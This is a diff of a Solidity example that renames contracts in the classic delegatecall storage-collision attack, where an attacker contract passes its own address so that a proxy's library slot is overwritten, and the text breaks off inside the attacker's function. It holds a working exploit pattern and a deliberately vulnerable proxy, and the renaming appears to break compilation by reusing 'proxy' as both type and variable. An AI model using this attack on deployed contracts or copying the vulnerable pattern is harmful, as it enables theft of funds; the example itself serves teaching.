@@ -1,4 +1,4 @@
-contract Lib {
+contract Impl {
     uint public num;
 
     function performOperation(uint _num) public {
@@ -6,36 +6,36 @@ contract Lib {
     }
 }
 
-contract Vulnerable {
-    address public lib;
+contract proxy {
+    address public impl;
     address public owner;
     uint public num;
 
-    constructor(address _lib) {
-        lib = _lib;
+    constructor(address _impl) {
+        impl = _impl;
         owner = msg.sender;
     }
 
     function performOperation(uint _num) public {
-        lib.delegatecall(abi.encodeWithSignature("performOperation(uint256)", _num));
+        impl.delegatecall(abi.encodeWithSignature("performOperation(uint256)", _num));
     }
 }
 
-contract AttackVulnerable {
+contract Attackproxy {
 
-    address public lib;
+    address public impl;
     address public owner;
     uint public num;
 
-    Vulnerable public vulnerable;
+    proxy public proxy;
 
-    constructor(Vulnerable _vulnerable) {
-        vulnerable = Vulnerable(_vulnerable);
+    constructor(proxy _proxy) {
+        proxy = proxy(_proxy);
     }
 
     function attack() public {
-        vulnerable.performOperation(uint(uint160(address(this))));
-        vulnerable.performOperation(9);
+        proxy.performOperation(uint(uint160(address(this))));
+        proxy.performOperation(9);
     }
 
     function performOperation(uint _num) public {
